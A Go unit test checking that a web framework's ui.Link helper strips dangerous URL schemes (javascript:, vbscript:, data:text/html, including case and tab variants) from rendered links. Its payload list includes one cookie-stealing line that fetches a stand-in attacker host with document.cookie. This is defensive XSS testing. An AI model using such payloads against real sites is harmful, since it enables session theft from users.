package main

import (
	"strings"
	"testing"

	"github.com/DonaldMurillo/gofastr/framework/ui"
)

// The constructor the auth footer now names has to hold up its end. This runs
// ui.Link on the same payloads and reads the rendered anchor, so the pass above
// is anchored to real rendered output rather than to a string match on emitted
// Go. It is the only end-to-end half of the property available in this package.
func TestUILinkNeutralizesBadScheme(t *testing.T) {
	for _, href := range []string{
		"javascript:fetch('//attacker.test/'+document.cookie)",
		"JavaScript:PWN()",
		"java\tscript:PWN()",
		"data:text/html,<script>1</script>",
		"vbscript:PWN()",
	} {
		got := string(ui.Link(ui.LinkConfig{Href: href, Text: "Create an account"}))
		low := strings.ToLower(got)
		for _, bad := range []string{"javascript:", "vbscript:", "data:text/html"} {
			if strings.Contains(low, bad) {
				t.Errorf("SECURITY: [url-scheme] ui.Link rendered %q: %s", href, got)
			}
		}
	}
	// Control: a legitimate href survives, so the guard does not blank every
	// anchor the auth screens emit.
	if !strings.Contains(string(ui.Link(ui.LinkConfig{Href: "/register", Text: "Create an account"})), `href="/register"`) {
		t.Error("ui.Link dropped a safe relative href")
	}
}
